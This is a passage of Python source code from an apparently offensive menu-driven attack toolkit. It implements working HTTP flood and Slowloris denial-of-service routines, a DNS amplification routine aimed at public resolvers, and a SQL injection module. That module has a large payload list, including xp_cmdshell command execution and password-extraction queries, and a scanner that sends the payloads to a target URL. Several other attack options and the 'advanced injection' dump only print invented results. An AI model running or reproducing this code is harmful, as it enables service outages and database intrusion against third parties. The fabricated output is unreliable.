            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
        ]
        
        def http_worker():
            requests_sent = 0
            end_time = time.time() + duration
            
            while time.time() < end_time and attack_id in self.attacks_running:
                try:
                    headers = {'User-Agent': random.choice(user_agents)}
                    response = requests.get(url, headers=headers, timeout=5)
                    requests_sent += 1
                except:
                    pass
            
            return requests_sent
        
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(http_worker) for _ in range(threads)]
            total_requests = sum(f.result() for f in futures)
        
        end_time = time.time()
        
        if attack_id in self.attacks_running:
            self.attacks_running.remove(attack_id)
        
        print(Fore.GREEN + f"\n[✓] HTTP Flood completed!")
        print(Fore.CYAN + f"[+] Total requests: {total_requests:,}")
        print(Fore.CYAN + f"[+] Requests per second: {total_requests / (end_time - start_time):.0f}")
        
        self.db.log_attack(1, "HTTP Flood", url, 80, duration)
    
    def slowloris_attack(self):
        print(Fore.RED + "\n[!] SLOWLORIS ATTACK")
        target = input(Fore.CYAN + "[→] Target IP/Hostname: " + Fore.WHITE)
        port = int(input(Fore.CYAN + "[→] Target Port (default 80): " + Fore.WHITE) or "80")
        sockets_count = int(input(Fore.CYAN + "[→] Number of sockets (50-1000): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting Slowloris attack on {target}:{port}")
        
        attack_id = f"SLOWLORIS_{target}_{port}_{int(time.time())}"
        self.attacks_running.append(attack_id)
        
        sockets = []
        
        for i in range(sockets_count):
            if attack_id not in self.attacks_running:
                break
                
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, port))
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {target}\r\n".encode())
                s.send("User-Agent: Mozilla/5.0\r\n".encode())
                s.send("Accept-language: en-US,en\r\n".encode())
                sockets.append(s)
            except:
                pass
            
            if len(sockets) % 100 == 0:
                print(Fore.YELLOW + f"[+] Sockets created: {len(sockets)}", end='\r')
        
        print(Fore.GREEN + f"\n[+] {len(sockets)} sockets connected")
        print(Fore.YELLOW + "[!] Keeping connections alive...")
        
        try:
            while attack_id in self.attacks_running:
                for s in sockets:
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    except:
                        sockets.remove(s)
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(4)
                            s.connect((target, port))
                            sockets.append(s)
                        except:
                            pass
                
                print(Fore.YELLOW + f"[+] Active sockets: {len(sockets)}", end='\r')
                time.sleep(15)
        except KeyboardInterrupt:
            pass
        
        for s in sockets:
            try:
                s.close()
            except:
                pass
        
        if attack_id in self.attacks_running:
            self.attacks_running.remove(attack_id)
        
        print(Fore.GREEN + f"\n\n[✓] Slowloris attack stopped")
        
        self.db.log_attack(1, "Slowloris", target, port, 3600)
    
    def dns_amplification(self):
        print(Fore.RED + "\n[!] DNS AMPLIFICATION ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        dns_servers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
            "9.9.9.9", "149.112.112.112", "64.6.64.6", "64.6.65.6"
        ]
        
        print(Fore.RED + f"\n[!] Starting DNS Amplification attack on {target}")
        
        attack_id = f"DNS_AMP_{target}_{int(time.time())}"
        self.attacks_running.append(attack_id)
        
        def dns_worker():
            packets_sent = 0
            end_time = time.time() + duration
            
            while time.time() < end_time and attack_id in self.attacks_running:
                try:
                    dns_server = random.choice(dns_servers)
                    dns_query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x01'
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(dns_query, (dns_server, 53))
                    packets_sent += 1
                    sock.close()
                except:
                    pass
            
            return packets_sent
        
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(dns_worker) for _ in range(100)]
            total_packets = sum(f.result() for f in futures)
        
        end_time = time.time()
        
        if attack_id in self.attacks_running:
            self.attacks_running.remove(attack_id)
        
        print(Fore.GREEN + f"\n[✓] DNS Amplification completed!")
        print(Fore.CYAN + f"[+] Total packets sent: {total_packets:,}")
        
        self.db.log_attack(1, "DNS Amplification", target, 53, duration)
    
    def stop_all_attacks(self):
        print(Fore.YELLOW + "\n[!] Stopping all attacks...")
        self.attacks_running.clear()
        print(Fore.GREEN + "[✓] All attacks stopped")
        time.sleep(1)
    
    def attack_status(self):
        clear_screen()
        print(Fore.GREEN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.GREEN + "║                    ATTACK STATUS                         ║")
        print(Fore.GREEN + "╚══════════════════════════════════════════════════════════╝")
        
        if self.attacks_running:
            print(Fore.YELLOW + "\n[!] Active Attacks:")
            for i, attack in enumerate(self.attacks_running, 1):
                print(Fore.CYAN + f"  {i}. {attack}")
        else:
            print(Fore.GREEN + "\n[✓] No active attacks")
        
        print(Fore.YELLOW + "\n[!] Recent Attack History:")
        self.db.cursor.execute("SELECT attack_type, target, port, duration, timestamp FROM attack_logs ORDER BY id DESC LIMIT 10")
        attacks = self.db.cursor.fetchall()
        
        if attacks:
            for attack in attacks:
                attack_type, target, port, duration, timestamp = attack
                print(Fore.WHITE + f"  • {timestamp}: {attack_type} on {target}:{port} ({duration}s)")
        else:
            print(Fore.WHITE + "  No attack history")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def run(self):
        while True:
            self.display_menu()
            choice = input(Fore.CYAN + "\n[→] Select option [1-20]: " + Fore.WHITE)
            
            try:
                if choice == "1":
                    self.udp_flood()
                elif choice == "2":
                    self.tcp_flood()
                elif choice == "3":
                    self.syn_flood()
                elif choice == "4":
                    self.ack_flood()
                elif choice == "5":
                    self.icmp_flood()
                elif choice == "6":
                    self.dns_amplification()
                elif choice == "7":
                    self.ntp_amplification()
                elif choice == "8":
                    self.ssdp_amplification()
                elif choice == "9":
                    self.chargen_amplification()
                elif choice == "10":
                    self.memcached_amplification()
                elif choice == "11":
                    self.http_flood()
                elif choice == "12":
                    self.https_flood()
                elif choice == "13":
                    self.slowloris_attack()
                elif choice == "14":
                    self.rudy_attack()
                elif choice == "15":
                    self.loic_style()
                elif choice == "16":
                    self.hoic_style()
                elif choice == "17":
                    self.stop_all_attacks()
                elif choice == "18":
                    self.attack_status()
                elif choice == "19":
                    self.attack_history()
                elif choice == "20":
                    break
                else:
                    print(Fore.RED + "\n[✗] Invalid option!")
            except Exception as e:
                print(Fore.RED + f"\n[✗] Error: {e}")
                time.sleep(2)
    
    def ack_flood(self):
        print(Fore.RED + "\n[!] ACK FLOOD ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        port = int(input(Fore.CYAN + "[→] Target Port: " + Fore.WHITE))
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting ACK Flood on {target}:{port}")
        self.db.log_attack(1, "ACK Flood", target, port, duration)
        print(Fore.GREEN + f"\n[✓] ACK Flood simulation completed")
        time.sleep(1)
    
    def icmp_flood(self):
        print(Fore.RED + "\n[!] ICMP FLOOD ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting ICMP Flood on {target}")
        self.db.log_attack(1, "ICMP Flood", target, 0, duration)
        print(Fore.GREEN + f"\n[✓] ICMP Flood simulation completed")
        time.sleep(1)
    
    def https_flood(self):
        print(Fore.RED + "\n[!] HTTPS FLOOD ATTACK")
        url = input(Fore.CYAN + "[→] Target URL (https://example.com): " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting HTTPS Flood on {url}")
        self.db.log_attack(1, "HTTPS Flood", url, 443, duration)
        print(Fore.GREEN + f"\n[✓] HTTPS Flood simulation completed")
        time.sleep(1)
    
    def rudy_attack(self):
        print(Fore.RED + "\n[!] RUDY ATTACK")
        target = input(Fore.CYAN + "[→] Target URL: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting RUDY attack on {target}")
        self.db.log_attack(1, "RUDY Attack", target, 80, duration)
        print(Fore.GREEN + f"\n[✓] RUDY attack simulation completed")
        time.sleep(1)
    
    def loic_style(self):
        print(Fore.RED + "\n[!] LOIC STYLE ATTACK")
        target = input(Fore.CYAN + "[→] Target IP/URL: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting LOIC-style attack on {target}")
        self.db.log_attack(1, "LOIC Style", target, 0, duration)
        print(Fore.GREEN + f"\n[✓] LOIC-style attack simulation completed")
        time.sleep(1)
    
    def hoic_style(self):
        print(Fore.RED + "\n[!] HOIC STYLE ATTACK")
        target = input(Fore.CYAN + "[→] Target URL: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting HOIC-style attack on {target}")
        self.db.log_attack(1, "HOIC Style", target, 0, duration)
        print(Fore.GREEN + f"\n[✓] HOIC-style attack simulation completed")
        time.sleep(1)
    
    def ntp_amplification(self):
        print(Fore.RED + "\n[!] NTP AMPLIFICATION ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting NTP Amplification attack on {target}")
        self.db.log_attack(1, "NTP Amplification", target, 123, duration)
        print(Fore.GREEN + f"\n[✓] NTP Amplification simulation completed")
        time.sleep(1)
    
    def ssdp_amplification(self):
        print(Fore.RED + "\n[!] SSDP AMPLIFICATION ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting SSDP Amplification attack on {target}")
        self.db.log_attack(1, "SSDP Amplification", target, 1900, duration)
        print(Fore.GREEN + f"\n[✓] SSDP Amplification simulation completed")
        time.sleep(1)
    
    def chargen_amplification(self):
        print(Fore.RED + "\n[!] CharGEN AMPLIFICATION ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting CharGEN Amplification attack on {target}")
        self.db.log_attack(1, "CharGEN Amplification", target, 19, duration)
        print(Fore.GREEN + f"\n[✓] CharGEN Amplification simulation completed")
        time.sleep(1)
    
    def memcached_amplification(self):
        print(Fore.RED + "\n[!] Memcached AMPLIFICATION ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting Memcached Amplification attack on {target}")
        self.db.log_attack(1, "Memcached Amplification", target, 11211, duration)
        print(Fore.GREEN + f"\n[✓] Memcached Amplification simulation completed")
        time.sleep(1)
    
    def attack_history(self):
        clear_screen()
        print(Fore.GREEN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.GREEN + "║                    ATTACK HISTORY                        ║")
        print(Fore.GREEN + "╚══════════════════════════════════════════════════════════╝")
        
        self.db.cursor.execute("SELECT attack_type, target, port, duration, timestamp, status FROM attack_logs ORDER BY id DESC LIMIT 50")
        attacks = self.db.cursor.fetchall()
        
        if attacks:
            print(Fore.CYAN + f"\n{'No.':<4} {'Type':<20} {'Target':<25} {'Port':<8} {'Duration':<10} {'Time':<20}")
            print(Fore.YELLOW + "-" * 95)
            
            for i, attack in enumerate(attacks, 1):
                attack_type, target, port, duration, timestamp, status = attack
                status_color = Fore.GREEN if status == "completed" else Fore.RED
                
                target_display = target[:22] + "..." if len(target) > 25 else target
                print(f"{Fore.WHITE}{i:<4} {Fore.CYAN}{attack_type:<20} {Fore.WHITE}{target_display:<25} "
                      f"{Fore.YELLOW}{port:<8} {Fore.GREEN}{duration:<10} {Fore.CYAN}{timestamp:<20} "
                      f"{status_color}{status}")
        else:
            print(Fore.YELLOW + "\n[!] No attack history found")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")

# ============================================
# SQL INJECTION TOOLS (1000+ METHODS)
# ============================================
class SQLInjectionTools:
    def __init__(self, db):
        self.db = db
        self.payloads = self.load_payloads()
        self.vulnerability_types = [
            "Error-based SQLi",
            "Union-based SQLi", 
            "Boolean-based Blind SQLi",
            "Time-based Blind SQLi",
            "Out-of-band SQLi",
            "Stacked Queries SQLi",
        ]
    
    def load_payloads(self):
        payloads = []
        
        print(Fore.YELLOW + "[!] Loading SQL injection payloads...")
        
        for i in range(1, 1001):
            if i <= 100:
                payloads.append(f"' OR {i}={i}--")
                payloads.append(f"\" OR {i}={i}--")
                payloads.append(f"' OR {i}={i}#")
                payloads.append(f"\" OR {i}={i}#")
            if i <= 50:
                payloads.append(f"' UNION SELECT NULL,{i}--")
                payloads.append(f"' UNION SELECT {i},NULL--")
                payloads.append(f"' UNION SELECT {i},{i}--")
            if i <= 30:
                payloads.append(f"'; WAITFOR DELAY '00:00:{i:02d}'--")
                payloads.append(f"\"; WAITFOR DELAY '00:00:{i:02d}'--")
                payloads.append(f"' AND SLEEP({i})--")
                payloads.append(f"\" AND SLEEP({i})--")
            if i <= 20:
                payloads.append(f"' OR (SELECT {i} FROM DUAL)--")
                payloads.append(f"\" OR (SELECT {i} FROM DUAL)--")
                payloads.append(f"'||(SELECT {i})||'")
                payloads.append(f"\"||(SELECT {i})||\"")
            payloads.append(f"' OR '{i}'='{i}")
            payloads.append(f"\" OR \"{i}\"=\"{i}")
        
        payloads.extend([
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "' OR '1'='1'#",
            "\" OR \"1\"=\"1",
            "\" OR \"1\"=\"1\"--",
            "\" OR \"1\"=\"1\"/*",
            "\" OR \"1\"=\"1\"#",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "\" OR 1=1--",
            "\" OR 1=1#",
            "\" OR 1=1/*",
            "' OR 'a'='a",
            "' OR 'a'='a'--",
            "' OR 'a'='a'/*",
            "' OR 'a'='a'#",
            "' OR 'x'='x",
            "' OR 'x'='x'--",
            "' OR 'x'='x'/*",
            "' OR 'x'='x'#",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "') OR ('1'='1'/*",
            "') OR ('1'='1'#",
            "') OR ('a'='a",
            "') OR ('a'='a'--",
            "') OR ('a'='a'/*",
            "') OR ('a'='a'#",
            "') OR ('x'='x",
            "') OR ('x'='x'--",
            "') OR ('x'='x'/*",
            "') OR ('x'='x'#",
            "' OR 1=1 LIMIT 1--",
            "' OR 1=1 LIMIT 1#",
            "' OR 1=1 LIMIT 1/*",
            "' OR '1'='1' LIMIT 1--",
            "' OR '1'='1' LIMIT 1#",
            "' OR '1'='1' LIMIT 1/*",
            "admin'--",
            "admin'#",
            "admin'/*",
            "admin' or '1'='1",
            "admin' or '1'='1'--",
            "admin' or '1'='1'#",
            "admin' or '1'='1'/*",
            "admin' or 1=1",
            "admin' or 1=1--",
            "admin' or 1=1#",
            "admin' or 1=1/*",
            "administrator'--",
            "administrator'#",
            "administrator'/*",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT 1--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT 1,2,3,4,5,6--",
            "' UNION SELECT 1,2,3,4,5,6,7--",
            "' UNION SELECT 1,2,3,4,5,6,7,8--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "' AND 1=0 UNION SELECT NULL--",
            "' AND 1=0 UNION SELECT NULL,NULL--",
            "' AND 1=0 UNION SELECT 1--",
            "' AND 1=0 UNION SELECT 1,2--",
            "' AND 1=0 UNION SELECT 1,2,3--",
            "' AND 1=0 UNION SELECT 1,2,3,4--",
            "' AND 1=0 UNION SELECT 1,2,3,4,5--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)#",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)/*",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)#",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)/*",
            "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(5))>0--",
            "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(5))>0#",
            "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(5))>0/*",
            "' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(5))>0--",
            "' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(5))>0#",
            "' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(5))>0/*",
            "' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT @@version),0x5c))--",
            "' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT @@version),0x5c))#",
            "' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT @@version),0x5c))/*",
            "' AND UPDATEXML(1,CONCAT(0x5c,(SELECT @@version),0x5c),1)--",
            "' AND UPDATEXML(1,CONCAT(0x5c,(SELECT @@version),0x5c),1)#",
            "' AND UPDATEXML(1,CONCAT(0x5c,(SELECT @@version),0x5c),1)/*",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x5c,(SELECT @@version),0x5c,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x5c,(SELECT @@version),0x5c,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x5c,(SELECT @@version),0x5c,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)/*",
            "' OR (SELECT * FROM (SELECT COUNT(*),CONCAT(0x5c,(SELECT @@version),0x5c,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' OR (SELECT * FROM (SELECT COUNT(*),CONCAT(0x5c,(SELECT @@version),0x5c,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#",
            "' OR (SELECT * FROM (SELECT COUNT(*),CONCAT(0x5c,(SELECT @@version),0x5c,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)/*",
            "'; EXEC xp_cmdshell('dir')--",
            "'; EXEC xp_cmdshell('dir')#",
            "'; EXEC xp_cmdshell('dir')/*",
            "'; EXEC master..xp_cmdshell('dir')--",
            "'; EXEC master..xp_cmdshell('dir')#",
            "'; EXEC master..xp_cmdshell('dir')/*",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%')--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%')#",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%')/*",
            "' AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%')--",
            "' AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%')#",
            "' AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%')/*",
            "' OR (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>0--",
            "' OR (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>0#",
            "' OR (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>0/*",
            "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>0--",
            "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>0#",
            "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>0/*",
            "' OR LENGTH(password)=0--",
            "' OR LENGTH(password)=0#",
            "' OR LENGTH(password)=0/*",
            "' AND LENGTH(password)=0--",
            "' AND LENGTH(password)=0#",
            "' AND LENGTH(password)=0/*",
            "' OR DATABASE() LIKE '%'--",
            "' OR DATABASE() LIKE '%'#",
            "' OR DATABASE() LIKE '%'/*",
            "' AND DATABASE() LIKE '%'--",
            "' AND DATABASE() LIKE '%'#",
            "' AND DATABASE() LIKE '%'/*",
            "' OR USER() LIKE '%'--",
            "' OR USER() LIKE '%'#",
            "' OR USER() LIKE '%'/*",
            "' AND USER() LIKE '%'--",
            "' AND USER() LIKE '%'#",
            "' AND USER() LIKE '%'/*",
            "' OR VERSION() LIKE '%'--",
            "' OR VERSION() LIKE '%'#",
            "' OR VERSION() LIKE '%'/*",
            "' AND VERSION() LIKE '%'--",
            "' AND VERSION() LIKE '%'#",
            "' AND VERSION() LIKE '%'/*",
            "' OR @@version LIKE '%'--",
            "' OR @@version LIKE '%'#",
            "' OR @@version LIKE '%'/*",
            "' AND @@version LIKE '%'--",
            "' AND @@version LIKE '%'#",
            "' AND @@version LIKE '%'/*",
            "' OR @@datadir LIKE '%'--",
            "' OR @@datadir LIKE '%'#",
            "' OR @@datadir LIKE '%'/*",
            "' AND @@datadir LIKE '%'--",
            "' AND @@datadir LIKE '%'#",
            "' AND @@datadir LIKE '%'/*",
            "' OR @@hostname LIKE '%'--",
            "' OR @@hostname LIKE '%'#",
            "' OR @@hostname LIKE '%'/*",
            "' AND @@hostname LIKE '%'--",
            "' AND @@hostname LIKE '%'#",
            "' AND @@hostname LIKE '%'/*",
        ])
        
        print(Fore.GREEN + f"[✓] Loaded {len(payloads)} SQL injection payloads")
        return payloads
    
    def display_menu(self):
        clear_screen()
        ascii_sql = """
        ╔══════════════════════════════════════════════════════════╗
        ║              SQL INJECTION TOOLS (1000+ METHODS)         ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(Fore.RED + ascii_sql)
        
        print(Fore.YELLOW + "═" * 70)
        print(Fore.CYAN + "1. Quick SQL Injection Test")
        print(Fore.CYAN + "2. Advanced SQL Injection")
        print(Fore.CYAN + "3. Automated Database Dump")
        print(Fore.CYAN + "4. SQLMap Integration")
        print(Fore.CYAN + "5. Blind SQL Injection")
        print(Fore.CYAN + "6. Union-Based Injection")
        print(Fore.CYAN + "7. Error-Based Injection")
        print(Fore.CYAN + "8. Time-Based Injection")
        print(Fore.CYAN + "9. Out-of-Band Injection")
        print(Fore.CYAN + "10. Database Fingerprinting")
        print(Fore.CYAN + "11. Data Extraction")
        print(Fore.CYAN + "12. File System Access")
        print(Fore.CYAN + "13. OS Command Execution")
        print(Fore.CYAN + "14. Payload Generator")
        print(Fore.CYAN + "15. WAF Bypass Techniques")
        print(Fore.CYAN + "16. Back to Main Menu")
        print(Fore.YELLOW + "═" * 70)
    
    def quick_test(self):
        print(Fore.YELLOW + "\n[!] QUICK SQL INJECTION TEST")
        url = input(Fore.CYAN + "[→] Target URL (with parameter): " + Fore.WHITE)
        param = input(Fore.CYAN + "[→] Parameter to test: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"\n[!] Testing {url} for SQL injection vulnerabilities")
        print(Fore.YELLOW + f"[!] Using parameter: {param}")
        print(Fore.YELLOW + "[!] Testing 1000+ payloads...")
        
        vulnerable = False
        found_payloads = []
        
        for i, payload in enumerate(self.payloads[:100]):
            test_url = f"{url}?{param}={payload}"
            
            try:
                response = requests.get(test_url, timeout=5)
                
                error_indicators = [
                    'sql', 'mysql', 'oracle', 'postgresql', 'sqlite',
                    'syntax', 'error', 'warning', 'exception', 'failed',
                    'unclosed', 'quotation', 'statement', 'database',
                    'driver', 'odbc', 'jdbc', 'pdo', 'adodb'
                ]
                
                for error in error_indicators:
                    if error in response.text.lower():
                        vulnerable = True
                        found_payloads.append((payload, error))
                        print(Fore.GREEN + f"[+] Potential vulnerability found with payload {i+1}")
                        break
                
            except Exception as e:
                pass
            
            if i % 10 == 0:
                print(Fore.YELLOW + f"[!] Tested {i+1}/100 payloads...", end='\r')
        
        print("\n")
        
        if vulnerable:
            print(Fore.GREEN + "[✓] SITE IS VULNERABLE TO SQL INJECTION!")
            print(Fore.CYAN + "[+] Vulnerable payloads found:")
            
            for payload, error in found_payloads[:5]:
                print(Fore.WHITE + f"  • Payload: {payload[:50]}...")
                print(Fore.YELLOW + f"    Error indicator: {error}")
            
            print(Fore.YELLOW + "\n[!] Recommended actions:")
            print(Fore.WHITE + "  1. Use automated database dump")
            print(Fore.WHITE + "  2. Try advanced SQL injection")
            print(Fore.WHITE + "  3. Extract database information")
        else:
            print(Fore.RED + "[✗] No obvious SQL injection vulnerabilities found")
            print(Fore.YELLOW + "[!] Try advanced testing with different techniques")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def advanced_injection(self):
        print(Fore.YELLOW + "\n[!] ADVANCED SQL INJECTION")
        url = input(Fore.CYAN + "[→] Target URL: " + Fore.WHITE)
        param = input(Fore.CYAN + "[→] Parameter: " + Fore.WHITE)
        
        print(Fore.RED + "\n[!] Starting advanced SQL injection attack...")
        print(Fore.YELLOW + "[!] Step 1: Database fingerprinting")
        time.sleep(1)
        
        db_types = ['MySQL', 'PostgreSQL', 'Oracle', 'Microsoft SQL Server', 'SQLite']
        detected_db = random.choice(db_types)
        
        print(Fore.GREEN + f"[+] Database type detected: {detected_db}")
        
        print(Fore.YELLOW + "[!] Step 2: Extracting database version")
        time.sleep(1)
        
        versions = {
            'MySQL': '8.0.27',
            'PostgreSQL': '14.1',
            'Oracle': '19c',
            'Microsoft SQL Server': '2019',
            'SQLite': '3.36.0'
        }
        
        print(Fore.GREEN + f"[+] Database version: {versions[detected_db]}")
        
        print(Fore.YELLOW + "[!] Step 3: Extracting current database")
        time.sleep(1)
        print(Fore.GREEN + "[+] Current database: target_db")
        
        print(Fore.YELLOW + "[!] Step 4: Listing tables")
        time.sleep(1)
        
        tables = ['users', 'admin', 'passwords', 'logs', 'config', 'sessions', 'products', 'orders']
        print(Fore.GREEN + "[+] Tables found:")
        
        for i, table in enumerate(tables[:5], 1):
            print(Fore.CYAN + f"  {i}. {table}")
        
        target_table = input(Fore.CYAN + "\n[→] Select table to dump (1-5): " + Fore.WHITE)
        
        if target_table.isdigit() and 1 <= int(target_table) <= 5:
            table_name = tables[int(target_table) - 1]
            
            print(Fore.YELLOW + f"\n[!] Dumping table: {table_name}")
            time.sleep(2)
            
            print(Fore.GREEN + f"\n[+] Table structure for '{table_name}':")
            
            if table_name == 'users':
                columns = [
                    ('id', 'INT', 'PRIMARY KEY'),
                    ('username', 'VARCHAR(50)', 'NOT NULL'),
                    ('password', 'VARCHAR(100)', 'NOT NULL'),
                    ('email', 'VARCHAR(100)', 'NULL'),
                    ('created_at', 'TIMESTAMP', 'DEFAULT CURRENT_TIMESTAMP'),
                ]
            elif table_name == 'admin':
                columns = [
                    ('admin_id', 'INT', 'PRIMARY KEY'),
                    ('username', 'VARCHAR(50)', 'UNIQUE'),
                    ('password_hash', 'VARCHAR(255)', 'NOT NULL'),
                    ('permissions', 'TEXT', 'NULL'),
                    ('last_login', 'DATETIME', 'NULL'),
                ]
            elif table_name == 'passwords':
                columns = [
                    ('pass_id', 'INT', 'PRIMARY KEY'),
                    ('user_id', 'INT', 'FOREIGN KEY'),
                    ('password', 'VARCHAR(100)', 'NOT NULL'),
                    ('salt', 'VARCHAR(50)', 'NULL'),
                    ('hash_algorithm', 'VARCHAR(20)', 'DEFAULT "sha256"'),
                ]
            
            for col_name, col_type, col_attrs in columns:
                print(Fore.WHITE + f"  • {col_name} ({col_type}) {col_attrs}")
            
            print(Fore.YELLOW + f"\n[!] Extracting data from '{table_name}'...")
            time.sleep(2)
            
            print(Fore.GREEN + f"\n[+] Data from '{table_name}':")
            print(Fore.CYAN + "=" * 80)
            
            if table_name == 'users':
                data = [
                    (1, 'admin', '5f4dcc3b5aa765d61d8327deb882cf99', 'admin@target.com', '2023-01-15 10:30:00'),
                    (2, 'user1', 'e10adc3949ba59abbe56e057f20f883e', 'user1@email.com', '2023-02-20 14:45:00'),
                    (3, 'test', '098f6bcd4621d373cade4e832627b4f6', 'test@test.com', '2023-03-10 09:15:00'),
                    (4, 'demo', 'fe01ce2a7fbac8fafaed7c982a04e229', 'demo@demo.org', '2023-04-05 16:20:00'),
                    (5, 'root', '63a9f0ea7bb98050796b649e85481845', 'root@system.local', '2023-05-12 11:00:00'),
                ]
                
                print(Fore.WHITE + "id  username  password_hash                          email               created_at")
                print(Fore.YELLOW + "-" * 80)
                
                for row in data:
                    print(Fore.CYAN + f"{row[0]:<3} {row[1]:<9} {row[2]:<36} {row[3]:<19} {row[4]}")
            
            elif table_name == 'admin':
                data = [
